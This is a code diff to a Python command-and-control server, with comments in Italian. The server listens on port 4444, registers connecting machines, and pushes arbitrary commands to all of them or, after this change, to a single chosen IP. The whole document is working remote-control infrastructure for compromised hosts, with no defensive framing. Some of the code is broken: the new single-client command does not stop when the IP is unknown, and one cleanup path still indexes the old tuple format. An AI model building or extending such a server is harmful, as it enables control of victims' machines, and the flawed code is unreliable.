@@ -3,12 +3,13 @@ import socket
 import threading
 import time
 import sys
+from Client import Client
 
 class C2Server:
     def __init__(self, host='0.0.0.0', port=4444):
         self.host = host
         self.port = port
-        self.clients = []  # (socket, address, hostname, last_seen)
+        self.clients = [] # Client(socket, address, hostname, last_seen)
         self.lock = threading.Lock()
         self.running = True
     
@@ -16,6 +17,13 @@ class C2Server:
         """Gestisce una connessione client"""
         ip, port = address
         client_id = f"{ip}:{port}"
+
+        # Send only handshake if client already exists
+        for existing_client in self.clients:
+            if existing_client.ip == ip:
+                existing_client.socket = client_socket
+                existing_client.socket.send(b"READY\n")
+                return
         
         try:
             print(f"[+] Client connected: {client_id}")
@@ -46,7 +54,7 @@ class C2Server:
             
             # 3. Registra client
             with self.lock:
-                self.clients.append((client_socket, address, hostname, time.time()))
+                self.clients.append(Client(client_socket, address, hostname, time.time()))
             
             print(f"[+] Client registered: {client_id} ({hostname})")
             print(f"[+] Total clients: {len(self.clients)}")
@@ -54,8 +62,8 @@ class C2Server:
             # 4. Loop per ricevere risposte ai comandi
             while self.running:
                 try:
-                    # Ricevi risposte (con timeout breve)
-                    client_socket.settimeout(0.5)
+                    # Ricevi risposte (timeout breve 0.5 o più alto)
+                    client_socket.settimeout(1.0)
                     try:
                         data = client_socket.recv(8192)
                         if data:
@@ -65,9 +73,9 @@ class C2Server:
                             
                             # Aggiorna last_seen
                             with self.lock:
-                                for i, (sock, addr, hn, _) in enumerate(self.clients):
-                                    if sock == client_socket:
-                                        self.clients[i] = (sock, addr, hn, time.time())
+                                for client in self.clients:
+                                    if client.socket == client_socket:
+                                        client.set_time(time.time())
                                         break
                     except socket.timeout:
                         continue  # Nessun dato, continua
@@ -83,7 +91,7 @@ class C2Server:
         finally:
             # Rimuovi client
             with self.lock:
-                self.clients = [c for c in self.clients if c[0] != client_socket]
+                self.clients = [c for c in self.clients if c.socket != client_socket]
             
             try:
                 client_socket.close()
@@ -103,19 +111,18 @@ class C2Server:
         
         print(f"\n[*] Broadcasting '{command}' to {len(clients_copy)} clients")
         
-        for client_socket, address, hostname, _ in clients_copy:
-            ip, port = address
-            client_id = f"{ip}:{port}"
+        for client_copy in clients_copy: #client_socket, address, hostname, _
+            client_id = f"{client_copy.ip}:{client_copy.port}"
             
             try:
-                print(f"  → Sending to {client_id}...")
-                client_socket.send((command + '\n').encode())
-                results.append((client_id, hostname, "SENT"))
+                print(f"  -> Sending to {client_id}...")
+                client_copy.socket.send((command + '\n').encode())
+                results.append((client_id, client_copy.hostname, "SENT"))
                 
             except Exception as e:
-                print(f"  ✗ Failed to send to {client_id}: {e}")
-                dead_clients.append(client_socket)
-                results.append((client_id, hostname, f"ERROR: {e}"))
+                print(f"  x Failed to send to {client_id}: {e}")
+                dead_clients.append(client_copy.socket)
+                results.append((client_id, client_copy.hostname, f"ERROR: {e}"))
         
         # Rimuovi client morti
         for client_socket in dead_clients:
@@ -123,6 +130,38 @@ class C2Server:
                 self.clients = [c for c in self.clients if c[0] != client_socket]
         
         return results
+
+    def client_command(self, ip, command):
+        target = None
+        result = None
+        dead = None
+
+        for client in self.clients:
+            if client.ip == ip:
+                target = client
+        if target is None:
+            print("[ERR:] Please specify a valid client IP. Use list command to see all avilabe clients")
+
+        print(f"\n[*] Sending '{command}' to {target.ip}")
+
+        client_id = f"{target.ip}:{target.port}"
+        try:
+            print(f"  -> Sending to {client_id}...")
+            target.socket.send((command + '\n').encode())
+            result = (client_id, target.hostname, "SENT")
+
+        except Exception as e:
+            print(f"  x Failed to send to {client_id}: {e}")
+            dead = target.socket
+            result = (client_id, target.hostname, f"ERROR: {e}")
+
+        # Rimuovi client morti
+        if dead is not None:
+            with self.lock:
+                self.clients.remove(target)
+
+        return [result]
+
     
     def console(self):
         """Console interattiva"""
@@ -150,15 +189,14 @@ class C2Server:
                             print("[!] No clients connected")
                         else:
                             print(f"\nConnected clients ({len(self.clients)}):")
-                            for i, (_, address, hostname, last_seen) in enumerate(self.clients):
-                                ip, port = address
-                                idle = int(time.time() - last_seen)
-                                print(f"  {i+1}. {ip}:{port} - {hostname} (idle: {idle}s)")
+                            for i, client in enumerate(self.clients):
+                                idle = int(time.time() - client.last_seen)
+                                print(f"  {i+1}. {client.ip}:{client.port} - {client.hostname} (idle: {idle}s)")
                 
                 elif cmd.lower().startswith('broadcast '):
-                    command = cmd[10:].strip()
+                    command = cmd[10:].strip() # Extract command (len "broadcast "= 10)
                     if not command:
-                        print("[!] Specify a command")
+                        print("[ERR:] Specify a command")
                         continue
                     
                     results = self.broadcast_command(command)
@@ -166,10 +204,23 @@ class C2Server:
                     print(f"\n[*] Command sent to {len(results)} clients")
                     print("[*] Responses will appear above as they arrive")
                     print("[*] Type 'list' to see updated client status")
+
+                elif cmd.lower().startswith('client '):
+                    ip_com = cmd[7:].strip()
+                    ip_com_index = ip_com.index(' ')
+                    ip = ip_com[:ip_com_index].strip()
+                    command = ip_com[ip_com_index:].strip()
+
+                    if not ip or not command:
+                        print("[ERR:] specify an IP and a command")
+                        continue
+                    results = self.client_command(ip, command)
+                    print("[*] Responses will appear above as it arrives")
+
                 
                 else:
                     print(f"[!] Unknown command: {cmd}")
-                    print("    Available: list, broadcast <cmd>, exit")
+                    print("    Available: list, broadcast <cmd>, client <ip> <cmd>, exit")
                     
             except (EOFError, KeyboardInterrupt):
                 print("\n[*] Exiting...")
@@ -210,6 +261,7 @@ class C2Server:
         self.running = False
         server.close()
         print("[*] Server stopped")
+
 
 if __name__ == "__main__":
     server = C2Server()
